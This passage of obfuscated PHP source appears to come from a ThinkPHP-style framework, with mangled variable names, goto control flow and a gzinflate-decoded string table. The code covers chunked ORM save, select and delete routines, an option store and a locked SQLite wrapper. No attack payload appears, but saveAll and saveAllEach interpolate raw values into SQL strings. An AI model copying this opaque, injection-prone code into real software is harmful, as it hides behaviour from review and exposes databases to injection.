$Bôøá³°×™[3]) { $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ] = call_user_func_array($Bôøá³°×™[1], $EÖîœ÷Åğ¦); } else { $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ] = call_user_func_array(array(&$this, $Bôøá³°×™[1]), $EÖîœ÷Åğ¦); } break; case $D§„ÚããÉƒ[261]: $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ] = $CÈ‹®ºõ§¦[$Bôøá³°×™[1]]; break; case $D§„ÚããÉƒ[282]: $båÇ›ğ²òŠ = $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ]; $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ] = json_decode($båÇ›ğ²òŠ, !0); if (is_null($CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ])) { $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ] = $båÇ›ğ²òŠ; } break; case $D§„ÚããÉƒ[311]: if ($CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ] === $D§„ÚããÉƒ[33]) { unset($CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ]); } break; case $D§„ÚããÉƒ[312]: $CÈ‹®ºõ§¦[$B¸¡ŠçÒÀŒ] = $Bôøá³°×™[1]; default: break; } } } public function saveAll($e‚é‘«ä×“) { goto eéŠÇ¯ÌÜ; føÄï˜‘: $a–Â±Ğœ»Ò = array(); $dÅ‰ ”§‹Ì = count($e‚é‘«ä×“); for ($dÕ²±Ô“â = 0; $dÕ²±Ô“â < $dÅ‰ ”§‹Ì; $dÕ²±Ô“â++) { $B£Å¥áÎ¸ = $e‚é‘«ä×“[$dÕ²±Ô“â]; if (!is_array($B£Å¥áÎ¸) || count($B£Å¥áÎ¸) != 4) { continue; } $Eìõµ×õ˜ƒ = "\125\x50\104\x41\124\105\40\140{$A¨—…¾÷Ûà}\140\40\x53\x45\x54\x20{$B£Å¥áÎ¸[2]}\x20\75\40\x43\101\x53\x45\x20{$B£Å¥áÎ¸[0]}\x20\xa"; if ($cÓè¹¢äÅ == 0) { $Aß´öÙ ® = $Eìõµ×õ˜ƒ; } $a–Â±Ğœ»Ò[] = $Eœ‰¬Š„¬[113] . $B£Å¥áÎ¸[1] . $Eœ‰¬Š„¬[113]; $cÓè¹¢äÅ++; $Aß´öÙ ® .= "\40\x57\110\105\x4e\40\47{$B£Å¥áÎ¸[1]}\x27\x20\x54\110\x45\x4e\x20\x27{$B£Å¥áÎ¸[3]}\47\40\xa"; if ($cÓè¹¢äÅ == $CªŠ°½¸é || $dÕ²±Ô“â == $dÅ‰ ”§‹Ì - 1) { goto eÁÌæ¶ÄÖ; eÁÌæ¶ÄÖ: $A•ÔÚ÷¶ª = implode($Eœ‰¬Š„¬[47], $a–Â±Ğœ»Ò); $Aß´öÙ ® .= "\x20\x45\x4e\x44\40\x20\x57\110\105\122\105\40{$B£Å¥áÎ¸[0]}\x20\111\116\40\50{$A•ÔÚ÷¶ª}\51\40"; $this->execute($Aß´öÙ ®); goto BÃàãË¨í×; B¯¡‰Æ¥¹µ: $a–Â±Ğœ»Ò = array(); goto cªÖ§òª¿î; BÃàãË¨í×: $cÓè¹¢äÅ = 0; $Aß´öÙ ® = $Eìõµ×õ˜ƒ; $this->chunkEventCheck(count($a–Â±Ğœ»Ò)); goto B¯¡‰Æ¥¹µ; cªÖ§òª¿î: } } goto aÓ¶„ß°İì; eéŠÇ¯ÌÜ: $Eœ‰¬Š„¬ =& $_SERVER[¼€¼ˆ¦‚¡]; $A¨—…¾÷Ûà = $this->tablePrefix . $this->tableName; $CªŠ°½¸é = self::SQL_WHERE_IN_CHUNK; goto F–ô“†ÙÑ; aÓ¶„ß°İì: $this->chunkEventSet(); goto EÀ±¼äïÊ; F–ô“†ÙÑ: $e‚é‘«ä×“ = is_array($e‚é‘«ä×“) ? $e‚é‘«ä×“ : array(); $Aß´öÙ ® = $Eœ‰¬Š„¬[361]; $cÓè¹¢äÅ = 0; goto føÄï˜‘; EÀ±¼äïÊ: } public function saveAllEach($E†ç¨í¥—Ì) { $AÚñ……¹ =& $_SERVER[¼€¼ˆ¦‚¡]; $DÎÖ‡–ï´‘ = $this->tablePrefix . $this->tableName; foreach ($E†ç¨í¥—Ì as $FÁß½ïˆ®Ö) { if (!is_array($FÁß½ïˆ®Ö) || count($FÁß½ïˆ®Ö) != 4) { continue; } $CÙ‡ò‘° = $FÁß½ïˆ®Ö[0] . $AÚñ……¹[362] . $FÁß½ïˆ®Ö[1] . $AÚñ……¹[113]; $DÁ®–Å´Ãª = $FÁß½ïˆ®Ö[2] . $AÚñ……¹[362] . $FÁß½ïˆ®Ö[3] . $AÚñ……¹[113]; $A¿ŒÚ†ÁÔÑ = "\x75\x70\x64\141\164\145\40{$DÎÖ‡–ï´‘}\x20\x73\145\164\x20{$DÁ®–Å´Ãª}\40\167\x68\x65\x72\145\x20{$CÙ‡ò‘°}\x3b"; $this->execute($A¿ŒÚ†ÁÔÑ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($b»ª¢Ãéè³ = false, $A‘£˜Ù–ğ‡ = false) { $this->_chunkEvent = $b»ª¢Ãéè³; $this->_chunkEventParam = $A‘£˜Ù–ğ‡; } private function chunkEventCheck($fè¢ã›™ÅÉ) { if (!$this->_chunkEvent) { return; } $Cè ñ¯ÙÉ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Cè ñ¯ÙÉ[$_SERVER[¼€¼ˆ¦‚¡][363]] = $fè¢ã›™ÅÉ; Hook::trigger($this->_chunkEvent, $Cè ñ¯ÙÉ); } public function addAll($aÛÕ‹Î˜×™, $d‘ÙæÊ“Õ = array(), $C ´î´È¥™ = false) { goto FŒàÅÊœ§ ; c¬ä–´˜Ê: if (empty($aÛÕ‹Î˜×™)) { $this->error = think_lang($bÕÍ—ØƒÏ½[259]); return !1; } $d‘ÙæÊ“Õ = $this->_parseOptions($d‘ÙæÊ“Õ); foreach ($aÛÕ‹Î˜×™ as $AìãÀ×´« => $C©¯„óôª) { $aÛÕ‹Î˜×™[$AìãÀ×´«] = $this->_facade($C©¯„óôª); $this->_beforeInsert($aÛÕ‹Î˜×™[$AìãÀ×´«], $d‘ÙæÊ“Õ); } goto d É»Å²‹Š; d É»Å²‹Š: if (method_exists($this->db, $bÕÍ—ØƒÏ½[260])) { for ($AğŠĞƒè‰Ë = 0; $AğŠĞƒè‰Ë < count($aÛÕ‹Î˜×™); $AğŠĞƒè‰Ë += $BîÀ¥«Á²·) { $A§ó´ƒ²ôÕ = array_slice($aÛÕ‹Î˜×™, $AğŠĞƒè‰Ë, $BîÀ¥«Á²·); if (!is_array($A§ó´ƒ²ôÕ) || count($A§ó´ƒ²ôÕ) == 0) { break; } $D¡êµÔµ¥¶ = $this->db->insertAll($A§ó´ƒ²ôÕ, $d‘ÙæÊ“Õ, $C ´î´È¥™); $this->chunkEventCheck(count($A§ó´ƒ²ôÕ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aÛÕ‹Î˜×™ as $AìãÀ×´« => $C©¯„óôª) { $D¡êµÔµ¥¶ = $this->db->insert($C©¯„óôª, $d‘ÙæÊ“Õ, $C ´î´È¥™); } $this->commit(); } if (!1 !== $D¡êµÔµ¥¶) { $d†ˆ£Â˜İˆ = $this->getLastInsID(); if ($d†ˆ£Â˜İˆ) { return $d†ˆ£Â˜İˆ; } } return $D¡êµÔµ¥¶; goto B‘ß†ÒÛ‘; FŒàÅÊœ§ : $bÕÍ—ØƒÏ½ =& $_SERVER[¼€¼ˆ¦‚¡]; ignore_timeout(); $BîÀ¥«Á²· = self::SQL_WHERE_IN_CHUNK; goto c¬ä–´˜Ê; B‘ß†ÒÛ‘: } public function save($A£¿ÖóÍÜø = '', $eÓœ¼ŞöÖ = array()) { goto bÕ¿«ææÊõ; f¢¢—£ßµÒ: $cœˆ“‡’Ù  = $this->findWhereField($f¨¥Ï—ˆ¿); if (!$cœˆ“‡’Ù ) { return parent::save($A£¿ÖóÍÜø, $eÓœ¼ŞöÖ); } $Fˆ×šæŒÃ› = 0; goto aÖÌù¿œ»; bÕ¿«ææÊõ: $F‹¶²Ú¸Ê =& $_SERVER[¼€¼ˆ¦‚¡]; $F×ºñ§÷Ò = self::SQL_WHERE_IN_CHUNK; $f¨¥Ï—ˆ¿ = $this->optionsValue(); goto f¢¢—£ßµÒ; aÖÌù¿œ»: $F¬Æ¦¡†Ç = $f¨¥Ï—ˆ¿[$F‹¶²Ú¸Ê[263]][$cœˆ“‡’Ù ][1]; $F¬Æ¦¡†Ç = is_array($F¬Æ¦¡†Ç) ? $F¬Æ¦¡†Ç : array(); $bŠ¾ˆöÙ÷ = count($F¬Æ¦¡†Ç); goto BÄĞ¡œÎ; BÄĞ¡œÎ: for ($C›åø„‘ø = 0; $C›åø„‘ø < $bŠ¾ˆöÙ÷; $C›åø„‘ø += $F×ºñ§÷Ò) { $b¿äÂÑä÷² = array_slice($F¬Æ¦¡†Ç, $C›åø„‘ø, $F×ºñ§÷Ò); if (!is_array($b¿äÂÑä÷²) || count($b¿äÂÑä÷²) == 0) { break; } $f¨¥Ï—ˆ¿[$F‹¶²Ú¸Ê[263]][$cœˆ“‡’Ù ][1] = $b¿äÂÑä÷²; $this->optionsValue($f¨¥Ï—ˆ¿); $Fˆ×šæŒÃ› += parent::save($A£¿ÖóÍÜø, $eÓœ¼ŞöÖ); $this->chunkEventCheck(count($b¿äÂÑä÷²)); } $this->chunkEventSet(); return $Fˆ×šæŒÃ›; goto AŒœÆç–©İ; AŒœÆç–©İ: } public function add($F‡÷ÂºÎ¸÷ = '', $aã¤ºŠ½¦Ç = array(), $F®Œø®Û§Å = false) { if ($this->addTaskStatus && is_array($F‡÷ÂºÎ¸÷)) { $this->addTaskData[] = $F‡÷ÂºÎ¸÷; return; } return parent::add($F‡÷ÂºÎ¸÷, $aã¤ºŠ½¦Ç, $F®Œø®Û§Å); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($AïÂ¨£½Ôà = array()) { goto fé†«„Ğ²; fé†«„Ğ²: $a‚©’Á‰Ï =& $_SERVER[¼€¼ˆ¦‚¡]; $cÊ¹òÚêÆ = self::SQL_WHERE_IN_CHUNK; $fƒ½ğ‘Óöô = $this->optionsValue(); goto DµÜîØöÃß; bµ™Ù‹¸ÉÖ: $cÛë÷ğ£“Ì = is_array($cÛë÷ğ£“Ì) ? $cÛë÷ğ£“Ì : array(); $c©«õ‹‡„ = null; for ($Bî¯õé¦Ã = 0; $Bî¯õé¦Ã < count($cÛë÷ğ£“Ì); $Bî¯õé¦Ã += $cÊ¹òÚêÆ) { $CšÕ§ˆÒ†æ = array_slice($cÛë÷ğ£“Ì, $Bî¯õé¦Ã, $cÊ¹òÚêÆ); if (!is_array($CšÕ§ˆÒ†æ) || count($CšÕ§ˆÒ†æ) == 0) { break; } $fƒ½ğ‘Óöô[$a‚©’Á‰Ï[263]][$fÉÌ½ËÀì©][1] = $CšÕ§ˆÒ†æ; $this->optionsValue($fƒ½ğ‘Óöô); $DŒ†ÁèªŠ„ = parent::select($AïÂ¨£½Ôà); if (!$DŒ†ÁèªŠ„) { continue; } if (is_null($c©«õ‹‡„)) { $c©«õ‹‡„ = array(); } $c©«õ‹‡„ = array_merge($c©«õ‹‡„, $DŒ†ÁèªŠ„); } goto B¡ğ¿ŒÃ£; DµÜîØöÃß: $fÉÌ½ËÀì© = $this->findWhereField($fƒ½ğ‘Óöô); if (!$fÉÌ½ËÀì© || isset($fƒ½ğ‘Óöô[$a‚©’Á‰Ï[280]]) || isset($fƒ½ğ‘Óöô[$a‚©’Á‰Ï[340]])) { return parent::select($AïÂ¨£½Ôà); } $cÛë÷ğ£“Ì = $fƒ½ğ‘Óöô[$a‚©’Á‰Ï[263]][$fÉÌ½ËÀì©][1]; goto bµ™Ù‹¸ÉÖ; B¡ğ¿ŒÃ£: return $c©«õ‹‡„; goto cƒå÷¿õÍº; cƒå÷¿õÍº: } public function delete($dˆ¼àŠ÷œ = array()) { goto fæ‘ß”‰¡‘; e·ÕÆ†: return $cŠŒœ±Œ¯¿; goto cÕ¸Ã†ƒ¨ƒ; fæ‘ß”‰¡‘: $e¨Šî¸¸ÛÀ =& $_SERVER[¼€¼ˆ¦‚¡]; $D£…·İßİé = self::SQL_WHERE_IN_CHUNK; $EŒ«¤ºïá = $this->optionsValue(); goto aŒò‰µõåÎ; FØÃä‹¦ï: $EÉŸÔ„ğáÉ = $EŒ«¤ºïá[$e¨Šî¸¸ÛÀ[263]][$FóŠÇí®¼â][1]; $EÉŸÔ„ğáÉ = is_array($EÉŸÔ„ğáÉ) ? $EÉŸÔ„ğáÉ : array(); for ($F¹ìÓÖµĞÌ = 0; $F¹ìÓÖµĞÌ < count($EÉŸÔ„ğáÉ); $F¹ìÓÖµĞÌ += $D£…·İßİé) { $c‚åÄ‘¡ù = array_slice($EÉŸÔ„ğáÉ, $F¹ìÓÖµĞÌ, $D£…·İßİé); if (!is_array($c‚åÄ‘¡ù) || count($c‚åÄ‘¡ù) == 0) { break; } $EŒ«¤ºïá[$e¨Šî¸¸ÛÀ[263]][$FóŠÇí®¼â][1] = $c‚åÄ‘¡ù; $this->optionsValue($EŒ«¤ºïá); $cŠŒœ±Œ¯¿ += parent::delete($dˆ¼àŠ÷œ); } goto e·ÕÆ†; aŒò‰µõåÎ: $FóŠÇí®¼â = $this->findWhereField($EŒ«¤ºïá); if (!$FóŠÇí®¼â) { return parent::delete($dˆ¼àŠ÷œ); } $cŠŒœ±Œ¯¿ = 0; goto FØÃä‹¦ï; cÕ¸Ã†ƒ¨ƒ: } private function findWhereField($fï‡–‚†°¬) { $e¸¯İóÚ„ =& $_SERVER[¼€¼ˆ¦‚¡]; $F´³»İø¸Ğ = self::SQL_WHERE_IN_CHUNK; if (!is_array($fï‡–‚†°¬) || !is_array($fï‡–‚†°¬[$e¸¯İóÚ„[263]])) { return !1; } foreach ($fï‡–‚†°¬[$e¸¯İóÚ„[263]] as $CÆ’Š±‡¾­ => $EÍÎ¡Á‘‘à) { if (is_array($EÍÎ¡Á‘‘à) && isset($EÍÎ¡Á‘‘à[0]) && is_string($EÍÎ¡Á‘‘à[0]) && strtolower($EÍÎ¡Á‘‘à[0]) == $e¸¯İóÚ„[7] && is_array($EÍÎ¡Á‘‘à[1]) && count($EÍÎ¡Á‘‘à[1]) > $F´³»İø¸Ğ) { ignore_timeout(); return $CÆ’Š±‡¾­; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\x6d\117\x70\x74\151\157\x6e"; public $field = array(); public function listData($Aµáõø–×¼ = false, $E£°¤Í†’¨ = "\155\157\144\151\146\171\x54\x69\x6d\x65", $DÙä›Â ó§ = false) { $d–µİñé˜ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$d–µİñé˜) { return $Aµáõø–×¼ ? null : array(); } if (!$Aµáõø–×¼) { $d–µİñé˜ = array_filter(array_values($d–µİñé˜)); return array_sort_by($d–µİñé˜, $E£°¤Í†’¨, $DÙä›Â ó§); } return $d–µİñé˜[$_SERVER[¼€¼ˆ¦‚¡][364] . $Aµáõø–×¼]; } public function insert($b«ÑƒùÌÀ‰) { goto Eˆëñ—Ã¢»; Aäùí†­­: $b«ÑƒùÌÀ‰[$fÊá šî°[107]] = time(); Model($this->modelType)->set($fÊá šî°[365], $a˜‹Êëñ¨à, $this->optionType . $fÊá šî°[366]); Model($this->modelType)->set($fÊá šî°[364] . $a˜‹Êëñ¨à, $b«ÑƒùÌÀ‰, $this->optionType); goto D–Í–Äâ§„; AÂ®Œ½±µœ: $a˜‹Êëñ¨à = $a˜‹Êëñ¨à ? $a˜‹Êëñ¨à : 0; $b«ÑƒùÌÀ‰[$fÊá šî°[367]] = ++$a˜‹Êëñ¨à; $b«ÑƒùÌÀ‰[$fÊá šî°[187]] = time(); goto Aäùí†­­; Eˆëñ—Ã¢»: $fÊá šî° =& $_SERVER[¼€¼ˆ¦‚¡]; $b«ÑƒùÌÀ‰ = array_field_key($b«ÑƒùÌÀ‰, $this->field); $a˜‹Êëñ¨à = Model($this->modelType)->get($fÊá šî°[365], $this->optionType . $fÊá šî°[366]); goto AÂ®Œ½±µœ; D–Í–Äâ§„: return $a˜‹Êëñ¨à; goto F´óŠæ„öá; F´óŠæ„öá: } public function update($BËÁ¤ÖƒĞÇ, $F £Â˜ğ½) { goto EøÍÁÖò“; B‰ÌËµ÷ñƒ: return Model($this->modelType)->set($føÜÂçÒÔ¤[364] . $BËÁ¤ÖƒĞÇ, $F £Â˜ğ½, $this->optionType); goto E¥ØŒå×™; EøÍÁÖò“: $føÜÂçÒÔ¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $F £Â˜ğ½ = array_field_key($F £Â˜ğ½, $this->field); $BæÀøÛ¦‹ö = $this->listData($BËÁ¤ÖƒĞÇ); goto A¹µ³Ë•ÃŠ; A¹µ³Ë•ÃŠ: if (!$BæÀøÛ¦‹ö) { return !1; } $F £Â˜ğ½ = array_merge($BæÀøÛ¦‹ö, $F £Â˜ğ½); $F £Â˜ğ½[$føÜÂçÒÔ¤[107]] = time(); goto B‰ÌËµ÷ñƒ; E¥ØŒå×™: } public function remove($AËáÇÊğ¶) { return Model($this->modelType)->remove($_SERVER[¼€¼ˆ¦‚¡][364] . $AËáÇÊğ¶, $this->optionType); } public function clear() { $BáÊ±ãÈÀ‚ =& $_SERVER[¼€¼ˆ¦‚¡]; Model($this->modelType)->remove($BáÊ±ãÈÀ‚[365], $this->optionType . $BáÊ±ãÈÀ‚[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Aª¦œñ¬áó, $E­²‘•ñ¹Ê) { if (!$E­²‘•ñ¹Ê) { return !1; } $BÌ«‡Ë–÷ = $this->listData(); $BÌ«‡Ë–÷ = array_to_keyvalue($BÌ«‡Ë–÷, $Aª¦œñ¬áó); return isset($BÌ«‡Ë–÷[$E­²‘•ñ¹Ê]) ? $BÌ«‡Ë–÷[$E­²‘•ñ¹Ê] : !1; } public function findByName($Cºˆô¾ø¨¢) { return $this->findByKey($_SERVER[¼€¼ˆ¦‚¡][28], $Cºˆô¾ø¨¢); } protected function resetData($Cê¾§Æª) { $bàÜƒçäêĞ =& $_SERVER[¼€¼ˆ¦‚¡]; $Cê¾§Æª = is_array($Cê¾§Æª) ? $Cê¾§Æª : array(); $C­íµªĞÌã = array(); for ($D†÷´Ô‹Ú¾ = 0; $D†÷´Ô‹Ú¾ < count($Cê¾§Æª); $D†÷´Ô‹Ú¾++) { $C­íµªĞÌã[$bàÜƒçäêĞ[364] . $Cê¾§Æª[$D†÷´Ô‹Ú¾][$bàÜƒçäêĞ[367]]] = $Cê¾§Æª[$D†÷´Ô‹Ú¾]; } return Model($this->modelType)->set($C­íµªĞÌã, !1, $this->optionType); } private function getAutoName($fóŠñëéò) { $EŒáéÄ›ô = array_to_keyvalue($this->listData(), $_SERVER[¼€¼ˆ¦‚¡][28]); if (!$EŒáéÄ›ô || !isset($EŒáéÄ›ô[$fóŠñëéò])) { return $fóŠñëéò; } for ($e××ƒ¼ÒĞÕ = 1; $e××ƒ¼ÒĞÕ < count($EŒáéÄ›ô); $e××ƒ¼ÒĞÕ++) { $Eµ‰Æ½‚ğ‹ = $fóŠñëéò . "\x28{$e××ƒ¼ÒĞÕ}\51"; if (!isset($EŒáéÄ›ô[$Eµ‰Æ½‚ğ‹])) { return $Eµ‰Æ½‚ğ‹; } } return $Eµ‰Æ½‚ğ‹; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($b°î˜£Ã = false, $dº íÀ› = '', $DäÚ·´½ = false) { goto b©òõÒÛ¨; b©òõÒÛ¨: $FÕÅá®‡Ó• =& $_SERVER[¼€¼ˆ¦‚¡]; $e„æšˆ†“‹ = $this->cacheGet($dº íÀ›); $f¡Õ¬êÍÙ® = $this->optionDefault($dº íÀ›); goto A¶ÅÔ«õµá; A¶ÅÔ«õµá: $f¡Õ¬êÍÙ® = is_array($f¡Õ¬êÍÙ®) ? $f¡Õ¬êÍÙ® : array(); if (is_array($e„æšˆ†“‹)) { $e„æšˆ†“‹ = array_merge($f¡Õ¬êÍÙ®, $e„æšˆ†“‹); return $b°î˜£Ã ? isset($e„æšˆ†“‹[$b°î˜£Ã]) ? $e„æšˆ†“‹[$b°î˜£Ã] : null : $e„æšˆ†“‹; } $f­Ÿ±•Ã = $this->filterWhere(array($FÕÅá®‡Ó•[29] => $dº íÀ›)); goto FÓµ³×‚‹; FÓµ³×‚‹: $e„æšˆ†“‹ = $this->where($f­Ÿ±•Ã)->select(); $e„æšˆ†“‹ = array_to_keyvalue($e„æšˆ†“‹, $FÕÅá®‡Ó•[89], $FÕÅá®‡Ó•[359]); foreach ($e„æšˆ†“‹ as $b‰Á–¬¦íÛ => $e·Şé¨­¢„) { if ($DäÚ·´½ || in_array($b‰Á–¬¦íÛ, $this->jsonField)) { $e„æšˆ†“‹[$b‰Á–¬¦íÛ] = json_decode($e·Şé¨­¢„, !0); } } goto FªËìÂŒ®; FªËìÂŒ®: $this->cacheSet($dº íÀ›, $e„æšˆ†“‹); $e„æšˆ†“‹ = array_merge($f¡Õ¬êÍÙ®, $e„æšˆ†“‹); return $b°î˜£Ã ? $e„æšˆ†“‹[$b°î˜£Ã] : $e„æšˆ†“‹; goto C¹—ÇõŒÑÛ; C¹—ÇõŒÑÛ: } public function set($CÌšŞ¢ÂÛ˜, $FÃÙäÙ§†æ = false, $CŠâ­ó²è¨ = '') { goto B„Ú‘áÔçõ; Dš”ÊõÂİ: return $this->addAll($fÊ‘ô“§ê, array(), !0); goto Cîï¨»Èä; Dó‚•·’äÌ: $d÷ˆ¯œ¨‰ = is_array($CÌšŞ¢ÂÛ˜) ? $CÌšŞ¢ÂÛ˜ : array($CÌšŞ¢ÂÛ˜ => $FÃÙäÙ§†æ); foreach ($d÷ˆ¯œ¨‰ as $bè“Àîì¥¸ => $cªËñ·šŞ…) { if (is_array($cªËñ·šŞ…)) { $cªËñ·šŞ… = json_encode_force($cªËñ·šŞ…); } $this->checkLength($cªËñ·šŞ…, !1, $this->tableName . $DçÃ…ù†‘È[4] . $CÌšŞ¢ÂÛ˜); $cªËñ·šŞ… = self::textEncode($cªËñ·šŞ…); $d÷ˆ¯œ¨‰ = array($DçÃ…ù†‘È[29] => $CŠâ­ó²è¨, $DçÃ…ù†‘È[89] => $bè“Àîì¥¸, $DçÃ…ù†‘È[359] => $cªËñ·šŞ…); $fÊ‘ô“§ê[] = $this->filterWhere($d÷ˆ¯œ¨‰); } if (!$fÊ‘ô“§ê) { return !0; } goto Dš”ÊõÂİ; B„Ú‘áÔçõ: $DçÃ…ù†‘È =& $_SERVER[¼€¼ˆ¦‚¡]; $this->cacheRemove($CŠâ­ó²è¨); $fÊ‘ô“§ê = array(); goto Dó‚•·’äÌ; Cîï¨»Èä: } protected function optionDefault($a±ÖíÖÅ÷ = '') { return !1; } public function setDeep($fÅ²ù·˜ö, $eÜ¹Ú´”ì› = false, $F¡Œ¦’êæ = '') { $Eóˆ÷ê¹Î = explode($_SERVER[¼€¼ˆ¦‚¡][91], $fÅ²ù·˜ö); $d¬„½©ƒó = $this->get(); array_set_value($d¬„½©ƒó, $fÅ²ù·˜ö, $eÜ¹Ú´”ì›); $this->set($Eóˆ÷ê¹Î[0], $d¬„½©ƒó[$Eóˆ÷ê¹Î[0]], $F¡Œ¦’êæ); } public function remove($cÂ–™éš¬¸, $BÙÁ˜™Õñ = '') { $Bø˜ì—° =& $_SERVER[¼€¼ˆ¦‚¡]; $this->cacheRemove($BÙÁ˜™Õñ); $Aº„Èó¡ß = $this->filterWhere(array($Bø˜ì—°[89] => $cÂ–™éš¬¸, $Bø˜ì—°[29] => $BÙÁ˜™Õñ)); if (is_null($cÂ–™éš¬¸)) { unset($Aº„Èó¡ß[$Bø˜ì—°[89]]); } return $this->where($Aº„Èó¡ß)->delete(); } public function cacheSet($f‘»®–‰›Ì, $eéÀ ¢¸©À = false) { return Cache::set($this->cacheKey($f‘»®–‰›Ì), $eéÀ ¢¸©À); } public function cacheGet($EÇÙ‚£ÙÓ ) { return Cache::get($this->cacheKey($EÇÙ‚£ÙÓ )); } public function cacheRemove($AÕ¿˜‘ÜÌ) { return Cache::remove($this->cacheKey($AÕ¿˜‘ÜÌ)); } protected function filterWhere($aÊÄêÈÔª) { return $aÊÄêÈÔª; } protected function cacheKey($fæÇåË¨) { return $fæÇåË¨; } } goto AÓØŠçˆÑœ; E‡¨æÅéôì: $fö•ƒîå… = $_SERVER[¼€¼ˆ¦‚¡][547]; while ($fö•ƒîå… < $_SERVER[¼€¼ˆ¦‚¡][548]) { if ($fö•ƒîå… >= 0) { break; } $fö•ƒîå…++; } $_SERVER[™óşĞñ‡Ë] = explode($_SERVER[¼€¼ˆ¦‚¡][549], gzinflate(substr($_SERVER[¼€¼ˆ¦‚¡][550], 10, -8))); goto cÀùí×àŠ”; CÖõ½Òöİ: class DbSqlite3 extends DbSqlite3Base { public function query($A†«§¯¡©®) { goto dÁÕÜ™„•·; CÊÒÔ¬Ú§¹: if (!$a‰¦˜ï±ä) { return !1; } if (flock($a‰¦˜ï±ä, LOCK_EX)) { $A›íœï’¡— = parent::query($A†«§¯¡©®); flock($a‰¦˜ï±ä, LOCK_UN); fclose($a‰¦˜ï±ä); return $A›íœï’¡—; } flock($a‰¦˜ï±ä, LOCK_UN); goto D«ÓãøÔÇ¼; dÁÕÜ™„•·: $DèÛ–ŒÊáí =& $_SERVER[¼€¼ˆ¦‚¡]; $B“—Œà‹ÖŞ = DATA_PATH . $DèÛ–ŒÊáí[871]; $a‰¦˜ï±ä = fopen($B“—Œà‹ÖŞ, $DèÛ–ŒÊáí[872]); goto CÊÒÔ¬Ú§¹; D«ÓãøÔÇ¼: fclose($a‰¦˜ï±ä); show_json($DèÛ–ŒÊáí[873], !1); return !1; goto dê±§ãÓ‹å; dê±§ãÓ‹å: } public function execute($DÆËÚ¬öêƒ) { goto E–óË¢İ•; fç˜ãÍ²Ñ±: fclose($fÅâÏ¯±Ò); show_json($fÊÔÙŞÏ†¯[873], !1); return !1; goto CİøªµàŒ; E–óË¢İ•: $fÊÔÙŞÏ†¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $Dù—¬­²Åˆ = DATA_PATH . $fÊÔÙŞÏ†¯[871]; $fÅâÏ¯±Ò = fopen($Dù—¬­²Åˆ, $fÊÔÙŞÏ†¯[872]); goto eÙëöóÏç; eÙëöóÏç: if (!$fÅâÏ¯±Ò) { return !1; } if (flock($fÅâÏ¯±Ò, LOCK_EX)) { $DÚŒö¢·Ü = parent::execute($DÆËÚ¬öêƒ); flock($fÅâÏ¯±Ò, LOCK_UN); fclose($fÅâÏ¯±Ò); return $DÚŒö¢·Ü; } flock($fÅâÏ¯±Ò, LOCK_UN); goto fç˜ãÍ²Ñ±; CİøªµàŒ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\x71" => "\x3c\x3e", "\x67\x74" => "\76", "\145\147\x74" => "\x3e\x3d", "\154\164" => "\x3c", "\145\x6c\x74" => "\74\x3d", "\156\157\164\x6c\x69\153\x65" => "\x4e\117\x54\x20\114\111\113\105", "\x6c\151\153\x65" => "\x4c\111\x4b\105", "\151\x6e" => "\111\116", "\x6e\157\x74\x69\x6e" => "\x4e\117\124\40\111\116", "\156\157\164\x20\x69\156" => "\x4e\117\x54\40\x49\116", "\x62\x65\x74\167\145\145\156" => "\102\105\124\x57\x45\x45\x4e", "\156\157\164\142\145\164\167\145\145\x6e" => "\x4e\x4f\124\x20\x42\x45\124\127\105\x45\116", "\x6e\x6f\x74\40\x62\145\x74\x77\145\x65\x6e" => "\116\x4f\124\40\x42\x45\124\127\105\105\116"); protected $selectSql = "\x53\x45\x4c\x45\103\124\x25\x44\111\x53\124\111\116\x43\x54\45\x20\x25\106\111\105\x4c\x44\45\x20\106\x52\x4f\115\x20\x25\124\101\x42\114\105\45\45\112\x4f\111\x4e\x25\x25\x57\x48\x45\x52\x45\x25\x25\107\122\x4f\x55\x50\45\x25\x48\x41\x56\x49\116\107\45\x25\117\x52\104\105\x52\x25\x25\114\x49\x4d\111\124\45\40\45\x55\116\111\117\x4e\45\45\x43\x4f\115\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $fˆÅ‹ÍÔ¬Ê = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¼€¼ˆ¦‚¡][874], $fˆÅ‹ÍÔ¬Ê); } public function factory($d†Ú–æä = '') { goto EÚÇ·°½; EÚÇ·°½: $a•ƒ‡ Øò =& $_SERVER[¼€¼ˆ¦‚¡]; $d†Ú–æä = $this->parseConfig($d†Ú–æä); if (empty($d†Ú–æä[$a•ƒ‡ Øò[875]])) { think_exception(think_lang($a•ƒ‡ Øò[876])); } goto céÔ…ë…„›; F¹Š†•Ì±ğ: return $c³¶ˆê¥“‚; goto FÍ½ØƒœõÄ; céÔ…ë…„›: $this->dbType = 